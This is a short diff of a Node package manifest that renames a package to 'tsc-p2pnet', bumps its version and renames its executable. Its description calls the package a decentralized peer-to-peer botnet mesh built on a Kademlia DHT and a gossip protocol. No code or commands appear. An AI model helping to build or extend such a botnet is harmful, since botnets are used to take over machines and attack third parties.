@@ -1,9 +1,9 @@
 {
-  "name": "tsc-p2p",
-  "version": "1.0.0",
+  "name": "tsc-p2pnet",
+  "version": "1.0.1",
   "description": "Decentralized P2P botnet mesh — Kademlia DHT + gossip protocol",
   "bin": {
-    "tsc-p2p": "bin/tsc-p2p.js"
+    "tsc-p2pnet": "bin/tsc-p2pnet.js"
   },
   "dependencies": {
     "minimist": "1.2.8"
